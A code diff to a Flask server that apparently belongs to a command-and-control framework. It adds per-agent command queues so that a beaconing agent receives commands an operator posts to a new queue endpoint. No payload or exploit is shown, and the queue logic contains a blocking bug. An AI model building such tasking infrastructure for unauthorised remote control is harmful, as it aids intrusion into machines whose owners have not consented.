@@ -3,6 +3,7 @@ from pymongo import MongoClient
 from base64 import b64decode
 from datetime import datetime
 from bson import json_util
+from queue import Queue
 
 import sarla.src.server.common.authentication as auth
 
@@ -12,6 +13,8 @@ client = MongoClient("localhost", 27017)
 
 db = client.sarla
 agents = db.agents
+
+map = {}
 
 
 def run():
@@ -26,7 +29,13 @@ def strip(data):
 
         return data
     except:
-        print("Error stripping POST data")
+        try:
+            data = data.rstrip("'")
+            data = data.lstrip("b'")
+
+            return data
+        except:
+            print("Error stripping POST data")
 
 
 @app.route("/api/register", methods=["POST"])
@@ -64,6 +73,10 @@ def negotiate():
         key = auth.generate_key(plaintext)
         agents.insert_one({"id": id, "key": key})
 
+        map.update({id: Queue(maxsize=10)})
+
+        print(map)
+
         return key
 
 
@@ -81,7 +94,30 @@ def beacon():
 
     agents.update_one(filter, values)
 
-    return "response"
+    query = {"id"}
+
+    id_json = agents.find_one(filter, query)
+
+    queue = map.get(id_json["id"])
+
+    if queue.qsize() > 0:
+        return queue.get()
+    else:
+        return ""
+
+
+@app.route("/api/client/queue", methods=["POST"])
+def queue():
+    json = request.get_json()
+
+    queue = map.get(json["id"])
+
+    queue.put(json["command"])
+
+    if queue.full():
+        return "Error"
+    else:
+        return ""
 
 
 @app.route("/api/client/agents")
